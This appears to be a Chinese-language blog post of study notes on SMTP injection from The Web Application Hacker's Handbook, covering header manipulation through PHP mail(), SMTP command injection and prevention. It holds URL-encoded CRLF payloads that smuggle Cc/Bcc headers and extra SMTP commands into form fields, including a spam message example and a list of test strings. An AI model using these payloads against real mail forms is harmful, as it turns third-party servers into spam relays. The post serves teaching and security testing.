---
layout:     post
title:      Chapter 10 Attacking Back-End Components(5)-Injecting into Mail Services
subtitle:   注入邮件服务
date:       2020-03-16
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 10

许多应用程序都包含供用户通过应用程序提交消息的功能，例如报告问题以支持人员或提供有关网站的反馈。 通常通过与邮件（或SMTP）服务器接口来实现此功能。 通常，用户提供的输入会插入到应用程序服务器与邮件服务器进行的SMTP对话中。 如果攻击者可以提交未经过滤或清除的合适的人工输入，则他可以将任意STMP命令注入此对话中。

在大多数情况下，该应用程序使您可以指定消息的内容和您自己的电子邮件地址（该地址将插入到结果电子邮件的"发件人"字段中）。 您也许还可以指定消息的主题和其他详细信息。 您控制的任何相关字段可能都容易受到SMTP注入的攻击。

垃圾邮件发送者经常利用SMTP注入漏洞，它们扫描Internet以查找易受攻击的邮件形式，并使用这些形式生成大量令人讨厌的电子邮件。

# 1.电子邮件标题处理(E-mail Header Manipulation)

考虑一下图10-6中所示的表格，该表格允许用户发送有关应用程序的反馈。

![figure10-6](/img/web_hacking/twahh/figure10-6.jpg)

用户可以在此处指定"发件人"地址和消息内容。 该应用程序将此输入传递给PHP `mail()`命令，该命令构造电子邮件并与其配置的邮件服务器执行必要的SMTP对话。 生成的邮件如下：
```
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Subject: Site problem

Confirm Order page doesn't load
```
PHP `mail()`命令使用`additional_headers`参数设置邮件的发件人地址。 此参数还用于通过用换行符分隔每个必需的标头来指定其他标头，包括`Cc`和`Bcc`。 因此，攻击者可以通过将这些标头之一注入"发件人"字段，从而将消息发送给任意收件人，如图10-7所示。

![figure10-7](/img/web_hacking/twahh/figure10-7.jpg)

这将导致mail（）命令生成以下消息：
```
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Bcc: all@wahh-othercompany.com
Subject: Site problem

Confirm Order page doesn't load
```

# 2.SMTP命令注入(SMTP Command Injection)

在其他情况下，应用程序可以自己执行SMTP对话，或者可以将用户提供的输入传递给其他组件以执行此操作。 在这种情况下，可以将任意SMTP命令直接注入此对话中，从而可能完全控制应用程序生成的消息。

例如，考虑使用以下形式的请求来提交站点反馈的应用程序：
```
POST feedback.php HTTP/1.1
Host: wahh-app.com
Content-Length: 56

From=daf@wahh-mail.com&Subject=Site+feedback&Message=foo
```
这将导致Web应用程序使用以下命令执行SMTP对话：
```
MAIL FROM: daf@wahh-mail.com
RCPT TO: feedback@wahh-app.com
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site feedback
foo
```

**NOTE**
SMTP客户端发出`DATA`命令后，它将发送电子邮件的内容，包括邮件头和正文。 然后，它在自己的行上发送一个点字符。 这告诉服务器消息已完成，然后客户端可以发出其他SMTP命令来发送其他消息。

在这种情况下，您可以将任意的SMTP命令注入到您控制的任何电子邮件字段中。 例如，您可以尝试按以下步骤插入到"主题"字段中：
```
POST feedback.php HTTP/1.1
Host: wahh-app.com
Content-Length: 266

From=daf@wahh-mail.com&Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d
%0aMAIL+FROM:+mail@wahh-viagra.com%0d%0aRCPT+TO:+john@wahh-mail
.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@wahh-mail
.com%0d%0aSubject:+Cheap+V1AGR4%0d%0aBlah%0d%0a%2e%0d%0a&Message=foo
```
如果该应用程序容易受到攻击，则会导致以下SMTP对话，该对话会生成两种不同的电子邮件。 第二个完全在您的控制范围内：
```
MAIL FROM: daf@wahh-mail.com
RCPT TO: feedback@wahh-app.com
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site+feedback
foo
.
MAIL FROM: mail@wahh-viagra.com
RCPT TO: john@wahh-mail.com
DATA
From: mail@wahh-viagra.com
To: john@wahh-mail.com
Subject: Cheap V1AGR4
Blah
.
foo
.
```

# 3.查找SMTP注入缺陷(Finding SMTP Injection Flaws)

为了有效地探查应用程序的邮件功能，您需要确定提交给与电子邮件相关的功能的每个参数，甚至是那些最初看起来与所生成消息的内容无关的参数。 您还应该测试每种攻击，并使用Windows和UNIX风格的换行符来执行每个测试用例。

**HACK STEPS**
- 1.您应该依次提交以下每个测试字符串作为每个参数，并在相关位置插入您自己的电子邮件地址：
```
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>

%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<y
ouremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aS
ubject:+test%0afoo%0a%2e%0a

%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0
d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%
0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0
afoo%0d%0a%2e%0d%0a
```
- 2.注意应用程序返回的所有错误消息。 如果这些问题似乎与电子邮件功能中的任何问题有关，请调查是否需要微调您的输入以利用漏洞。
- 3.应用程序的响应可能不会以任何方式表明漏洞是否存在或已被成功利用。 您应该监视指定的电子邮件地址，以查看是否收到任何邮件。
- 4.仔细检查生成相关请求的HTML表单。 这可能包含有关正在使用的服务器端软件的线索。 它还可能包含一个隐藏或禁用的字段，用于指定电子邮件的"收件人"地址，您可以直接对其进行修改。

**TIP**
向应用程序支持人员发送电子邮件的功能通常被认为是外围设备，可能未受到与主要应用程序功能相同的安全标准或测试。 另外，由于它们涉及到不寻常的后端组件的接口，因此通常是通过直接调用相关的操作系统命令来实现的。 因此，除了探查SMTP注入外，您还应该仔细检查OS命令注入漏洞的所有与电子邮件相关的功能。

# 4.防止SMTP注入(Preventing SMTP Injection)

通常，可以通过对传递给电子邮件功能或在SMTP对话中使用的任何用户提供的数据进行严格的验证，来防止SMTP注入漏洞。 给定使用目的，应尽可能严格地验证每个项目：
- 电子邮件地址应根据适当的正则表达式进行检查（当然，该表达式应拒绝任何换行符）。
- 邮件主题不应包含任何换行符，并且可以将其限制为合适的长度。
- 如果直接在SMTP对话中使用邮件的内容，则应禁止仅包含一个点的行。

# Summary

我们已经研究了针对后端应用程序组件的各种攻击，以及可以用来识别和利用每个组件的实际步骤。 在与应用程序交互的最初几秒钟内，可以发现许多实际漏洞。 例如，您可以在搜索框中输入一些意外的语法。 在其他情况下，这些漏洞可能非常微妙，表现为几乎无法检测到的差异。应用程序的行为，或者只有通过提交和处理精心设计的输入的多阶段过程才能达到。

为了确定您已经发现了应用程序中存在的后端注入漏洞，您需要既透彻又耐心。 实际上，每种类型的漏洞都可以在用户提供的几乎任何数据的处理中体现出来，这些数据包括查询字符串参数的名称和值，POST数据和cookie以及其他HTTP标头。 在许多情况下，只有当您对相关参数进行广泛探测后，才会出现缺陷准确了解您的输入正在执行哪种类型的处理，并仔细检查阻碍您前进的障碍。

面对针对后端应用程序组件的潜在攻击所呈现出的巨大潜在攻击面，您可能会感到，对应用程序的任何严重攻击都必须付出巨大的努力。 但是，学习攻击软件的技巧的一部分是要获得关于宝藏隐藏位置以及您的目标可能如何打开以便窃取它的第六种感觉。 获得这种感觉的唯一方法是通过练习。 您应该针对遇到的实际应用程序来练习我们描述的技术，并了解它们如何站立。


[Chapter 10 Attacking Back-End Components(4)-Injecting into Back-end HTTP Requests](https://dm116.github.io/2020/03/16/attacking-back-end-components_4/)<br>
[Chapter 11 Attacking Application Logic(1)-The Nature of Logic Flaws](https://dm116.github.io/2020/03/17/attacking-application-logic_1/)<br>
